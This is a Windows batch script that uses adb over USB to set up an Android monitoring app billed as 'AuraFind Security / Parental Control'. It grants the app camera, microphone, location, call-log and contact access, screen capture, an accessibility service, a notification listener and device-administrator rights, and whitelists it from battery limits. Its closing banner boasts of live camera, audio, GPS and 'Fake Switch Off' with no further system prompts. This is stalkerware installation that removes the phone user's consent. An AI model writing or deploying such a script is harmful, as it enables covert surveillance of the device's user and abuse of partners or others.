@echo off
title AuraFind Security - 1-Click USB Master Permissions Setup
color 0A
echo =====================================================================
echo    AURAFIND SECURITY / PARENTAL CONTROL - USB PERMISSIONS SETUP
echo =====================================================================
echo.
echo Connecting to USB device...
adb wait-for-device
echo [OK] Device detected!
echo.

echo [1/6] Granting Core Runtime Permissions (Camera, Mic, GPS, Storage)...
adb shell pm grant com.findmydevice.security android.permission.CAMERA
adb shell pm grant com.findmydevice.security android.permission.RECORD_AUDIO
adb shell pm grant com.findmydevice.security android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.findmydevice.security android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.findmydevice.security android.permission.ACCESS_BACKGROUND_LOCATION
adb shell pm grant com.findmydevice.security android.permission.READ_PHONE_STATE
adb shell pm grant com.findmydevice.security android.permission.READ_CALL_LOG
adb shell pm grant com.findmydevice.security android.permission.READ_CONTACTS
adb shell pm grant com.findmydevice.security android.permission.POST_NOTIFICATIONS
adb shell pm grant com.findmydevice.security android.permission.BODY_SENSORS
adb shell pm grant com.findmydevice.security android.permission.ACTIVITY_RECOGNITION

echo [2/6] Granting Elevated AppOps (Screen Mirroring, Floating Window, Usage Stats)...
adb shell appops set com.findmydevice.security SYSTEM_ALERT_WINDOW allow
adb shell appops set com.findmydevice.security GET_USAGE_STATS allow
adb shell appops set com.findmydevice.security PROJECT_MEDIA allow
adb shell appops set com.findmydevice.security MANAGE_MEDIA allow
adb shell appops set com.findmydevice.security DUMP allow
adb shell appops set com.findmydevice.security WRITE_SETTINGS allow

echo [3/6] Automatically Enabling AuraFind Accessibility Service...
adb shell settings put secure enabled_accessibility_services com.findmydevice.security/com.findmydevice.security.service.AuraFindAccessibilityService
adb shell settings put secure accessibility_enabled 1

echo [4/6] Enabling Notification Listener Service...
adb shell cmd notification allow_listener com.findmydevice.security/com.findmydevice.security.service.ChildNotificationMonitorService

echo [5/6] Whitelisting from Battery Optimization (24/7 Zero-Kill Background)...
adb shell dumpsys deviceidle whitelist +com.findmydevice.security

echo [6/6] Activating Device Administrator Protection...
adb shell dpm set-active-admin com.findmydevice.security/.service.AuraFindDeviceAdminReceiver

echo.
echo Launching AuraFind Security on phone...
adb shell am start -n com.findmydevice.security/.MainActivity

echo.
echo =====================================================================
echo [SUCCESS] ALL PERMISSIONS GRANTED PERMANENTLY!
echo Screen Mirroring, Live Camera, Audio, GPS, and Fake Switch Off are
echo fully unlocked without requiring any further system prompts.
echo =====================================================================
echo.
pause
